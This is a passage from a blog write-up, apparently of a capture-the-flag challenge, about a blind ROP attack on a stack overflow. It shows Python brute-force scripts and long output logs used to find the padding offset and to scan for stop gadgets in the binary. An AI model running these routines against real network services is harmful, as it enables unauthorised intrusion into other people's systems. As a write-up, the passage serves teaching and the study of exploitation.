\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x06@Bye!\n&#x27;</span><br><span class="line">[*] sending: b&#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#x27;</span><br><span class="line">[*] recv: b&#x27;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">40</span><br></pre></td></tr></table></figure>
<p>So now we know that we need 40 bytes of padding before the crash.</p>
<h3 id="Stack-reading"><a href="#Stack-reading" class="headerlink" title="Stack reading"></a>Stack reading</h3><p>Stack reading is just basically a bruteforce of some bytes to trigger the orginal behaviour of the program. It permits especially to leak a stack canary or some saved instruction pointers. But I directly tried to find some stop gadgets, to do so, I’m looking for something in the response. And the best stop gadget would be a unique pattern.</p>
<p>I developped this small function:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak2</span>(<span class="params">padding: <span class="built_in">str</span>, leak1=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        buf = padding + leak1 + p8(i)</span><br><span class="line">        resp = try_jmp(buf)</span><br><span class="line">        <span class="comment"># print(f&quot;Trying on &#123;hex(int.from_bytes(leak1+p8(i), &#x27;little&#x27;) &lt;&lt; (64 - counter*8))&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(resp):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(padd(leak1+p8(i)), <span class="string">&#x27;little&#x27;</span>))&#125;</span>] Output: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(leak1) &lt; <span class="number">8</span>:</span><br><span class="line">                leak2(padding, leak1=leak1+p8(i))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> leak1</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leak1</span><br><span class="line"></span><br><span class="line">leak2(<span class="string">b&quot;a&quot;</span>*<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<p>Which returns:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">[0x5] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#x27;</span><br><span class="line">[0x605] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#x27;</span><br><span class="line">[0x400605] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#x27;</span><br><span class="line">[0x400605] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#x27;</span><br><span class="line">[0x400605] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#x27;</span><br><span class="line">[0x1a] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#x27;</span><br><span class="line">[0x61a] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#x27;</span><br><span class="line">[0x40061a] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#x27;</span><br><span class="line">[0x40061a] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#x27;</span><br><span class="line">[0x1b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x61b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x40061b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x40061b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x40061b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x40061b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x1d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#x27;</span><br><span class="line">[0x61d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#x27;</span><br><span class="line">[0x40061d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#x27;</span><br><span class="line">[0x40061d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#x27;</span><br><span class="line">STOP: &lt;class &#x27;KeyboardInterrupt&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>I stopped the script because it’s very long by it’s already interesting to see that it seems we overwrite directly the return address, which means there is no canary. Morevever according to the addresses of the valid gadgets we found, the binary is not PIE based and it sounds to be a x86 binary. </p>
<h3 id="Stop-gadget"><a href="#Stop-gadget" class="headerlink" title="Stop gadget"></a>Stop gadget</h3><p>We can optimize the search of stop gadgets by bruteforcing only the two less significant bytes about the base address: <code>0x400000</code>, which gives this:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak2_opti</span>(<span class="params">padding: <span class="built_in">str</span></span>):</span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2000</span>):</span><br><span class="line">        buf = padding + p64(base+i)</span><br><span class="line">        resp = try_jmp(buf)</span><br><span class="line">        <span class="comment"># print(f&quot;Trying on &#123;hex(int.from_bytes(leak1+p8(i), &#x27;little&#x27;) &lt;&lt; (64 - counter*8))&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(resp):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>] Output: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leak1</span><br><span class="line"></span><br><span class="line">leak2(<span class="string">b&quot;a&quot;</span>*<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<p>Which prints:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">[0x4004cc] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@&#x27;</span><br><span class="line">[0x4004cd] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@&#x27;</span><br><span class="line">[0x4004dd] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@&#x27;</span><br><span class="line">[0x400550] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x05@&#x27;</span><br><span class="line">[0x400560] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400562] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400563] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400565] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400566] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400567] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400569] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x40056d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x40056e] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x40056f] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaao\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400570] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400576] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400577] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400596] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x05@&#x27;</span><br><span class="line">[0x400597] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x05@&#x27;</span><br><span class="line">[0x40059c] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9c\x05@&#x27;</span><br><span class="line">[0x40059d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9d\x05@&#x27;</span><br><span class="line">[0x4005a0] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x05@&#x27;</span><br><span class="line">[0x4005a1] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa1\x05@&#x27;</span><br><span class="line">[0x4005a3] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa3\x05@&#x27;</span><br><span class="line">[0x4005a5] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa5\x05@&#x27;</span><br><span class="line">[0x4005b4] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05@&#x27;</span><br><span class="line">[0x4005b7] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@&#x27;</span><br><span class="line">[0x4005b8] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x05@&#x27;</span><br><span class="line">[0x4005c0] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x05@&#x27;</span><br><span class="line">[0x4005d6] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x05@&#x27;</span><br><span class="line">[0x4005d7] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd7\x05@&#x27;</span><br><span class="line">[0x4005dd] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x05@&#x27;</span><br><span class="line">[0x4005de] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05@&#x27;</span><br><span class="line">[0x4005e1] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe1\x05@&#x27;</span><br><span class="line">[0x4005e2] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x05@&#x27;</span><br><span class="line">[0x4005e4] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x05@&#x27;</span><br><span class="line">[0x4005e5] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x05@&#x27;</span><br><span class="line">[0x4005e7] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe7\x05@&#x27;</span><br><span class="line">[0x4005e8] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\x05@&#x27;</span><br><span class="line">[0x4005eb] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x05@&#x27;</span><br><span class="line">[0x4005ec] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\x05@&#x27;</span><br><span class="line">[0x4005ee] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xee\x05@&#x27;</span><br><span class="line">[0x4005ef] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\x05@&#x27;</span><br><span class="line">[0x4005f1] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf1\x05@&#x27;</span><br><span class="line">[0x4005f3] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf3\x05@&#x27;</span><br><span class="line">[0x400605] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#x27;</span><br><span class="line">[0x400608] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\x06@&#x27;</span><br><span class="line">[0x40061a] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#x27;</span><br><span class="line">[0x40061b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#x27;</span><br><span class="line">[0x40061d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#x27;</span><br><span class="line">[0x400622] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;\x06@&#x27;</span><br><span class="line">[0x400650] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x06@&#x27;</span><br><span class="line">[0x400656] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400657] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400658] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x40065a] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x40065e] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa^\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400663] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x06@\x84(\xad\xfb\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400668] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x40066d] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x06@\x84(\xad\xfb&#x27;</span><br><span class="line">[0x400672] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\x06@\x84(\xad\xfb&#x27;</span><br><span class="line">[0x400677] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x06@&#x27;</span><br><span class="line">[0x400681] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x81\x06@&#x27;</span><br><span class="line">[0x4006b4] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006b5] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006b6] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006b8] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x06@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006bd] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbd\x06@\x84(\xad\xfb\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006c2] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc2\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006c7] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc7\x06@What is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x4006cc] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x06@Bye!\n&#x27;</span><br><span class="line">[0x4006d1] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd1\x06@\x84(\xad\xfb\n&#x27;</span><br><span class="line">[0x4006d6] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x06@&#x27;</span><br><span class="line">[0x4006db] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdb\x06@&#x27;</span><br><span class="line">[0x4006e2] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x06@&#x27;</span><br><span class="line">[0x4006e3] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe3\x06@&#x27;</span><br><span class="line">[0x4006e5] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x06@&#x27;</span><br><span class="line">[0x4006e6] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x06@&#x27;</span><br><span class="line">[0x40073b] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x07@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">[0x400742] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x07@&#x27;</span><br><span class="line">[0x400743] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@&#x27;</span><br><span class="line">[0x400758] Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@&#x27;</span><br></pre></td></tr></table></figure>

<p>If we read carefully, we can notice the <code>[0x400668] Output: b&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; &#39;</code> gadget.<br>It’s a very good stop gadget because it’s the only gadget which prints: <code>Thanks + padding + return_address_upto_null_byte + &gt;&gt;&gt; </code>.<br>And so for our attack we will use it.</p>
